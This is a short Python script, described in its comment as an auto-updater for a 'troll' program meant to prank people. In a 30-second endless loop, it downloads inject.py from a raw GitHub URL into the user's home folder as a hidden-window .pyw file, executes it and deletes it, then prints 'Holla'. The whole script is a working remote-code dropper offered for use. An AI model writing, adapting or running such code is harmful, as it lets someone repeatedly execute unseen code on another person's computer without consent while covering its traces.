# Auto Updates the troll.py to troll people :)
import os, time
while 1 == 1:
    
    def sleep(Time):
        import time as t
        t.sleep(Time)

    def trolls():
        print('Holla')

    def udownload():
        print('Downloading Update')
        home = os.path.expanduser("~")
        os.chdir(home)
        import urllib.request, pathlib
        dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/inject.py'
        path = str(home) + '\inject.pyw'
        urllib.request.urlretrieve(dlurl, '{}'.format(path))
        os.system('inject.pyw')
        os.remove('inject.pyw')

    udownload()
    sleep(30)
    trolls()